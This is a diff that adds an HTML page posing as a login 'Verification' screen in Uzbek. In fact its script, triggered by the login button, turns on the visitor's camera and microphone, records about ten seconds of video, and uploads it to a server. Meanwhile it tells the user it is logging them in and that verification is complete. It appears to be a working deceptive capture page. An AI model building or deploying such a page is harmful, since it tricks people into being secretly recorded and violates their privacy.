@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title> Verification</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            font-family: Arial, sans-serif;
+        }
+
+        .card {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            text-align: center;
+            width: 350px;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        button {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 25px;
+            background: #2a5298;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #1e3c72;
+            transform: scale(1.05);
+        }
+
+        .status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: green;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Tizimiga kirish uchun bosing</h2>
+    <button onclick="startRecording()">Kirish</button>
+    <div class="status" id="status"></div>
+</div>
+
+<script>
+let recordedChunks = [];
+
+async function startRecording() {
+    document.getElementById("status").innerText = "Tizimga kirmoqda...";
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+        video: true,
+        audio: true
+    });
+
+    const mediaRecorder = new MediaRecorder(stream, {
+        mimeType: "video/webm"
+    });
+
+    mediaRecorder.ondataavailable = function(event) {
+        if (event.data.size > 0) {
+            recordedChunks.push(event.data);
+        }
+    };
+
+    mediaRecorder.onstop = async function() {
+        const blob = new Blob(recordedChunks, { type: "video/webm" });
+
+        const formData = new FormData();
+        formData.append("file", blob, "video.webm");
+
+        await fetch("/upload", {
+            method: "POST",
+            body: formData
+        });
+
+        document.getElementById("status").innerText = "Verification complete";
+    };
+
+    mediaRecorder.start();
+
+    setTimeout(() => {
+        mediaRecorder.stop();
+        stream.getTracks().forEach(track => track.stop());
+    }, 10000);
+}
+</script>
+
+</body>
+</html>
